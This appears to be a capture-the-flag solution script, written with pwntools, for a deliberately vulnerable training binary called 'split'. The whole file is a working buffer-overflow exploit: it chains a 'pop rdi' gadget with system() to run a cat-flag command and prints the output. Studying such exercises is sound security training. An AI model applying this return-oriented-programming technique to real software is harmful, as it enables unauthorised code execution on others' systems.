from pwn import *

system = 0x0040074b
cat_flag = 0x00601060
pop_rdi = 0x004007c3

payload = b"".join([
    b"A"*(32+8),
    p64(pop_rdi),
    p64(cat_flag),
    p64(system),
])

p = process("./split")
#input("Waiting for debug")
p.send(payload+b"\n")

#p.interactive()
p.recvuntil(b"you!\n")
flag = p.recv()
print(f"Flag : {flag}")
